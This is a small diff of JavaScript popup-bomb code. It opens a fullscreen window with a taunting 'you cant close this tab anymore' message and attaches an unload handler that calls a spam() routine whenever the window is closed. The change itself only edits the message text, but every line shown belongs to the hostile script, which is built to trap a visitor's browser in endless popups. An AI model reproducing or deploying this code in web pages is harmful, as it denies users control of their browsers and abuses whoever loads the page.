@@ -5,7 +5,7 @@
     var count = 1;//open one popup initially
     var win = [];//array of windows
     win[0] = window.open('about:blank', '_blank', 'fullscreen = yes');//open the first window
-    win[0].document.body.innerHTML = '<html><title>YOU.</title>FOOL! (you cant close this tab anymore) </html>';//set the special content of the first window
+    win[0].document.body.innerHTML = '<html><title>YOU.</title>YOU FOOL! (you cant close this tab anymore) </html>';//set the special content of the first window
     win[0].onunload = function() {//make it spam when closed
           spam();
     }
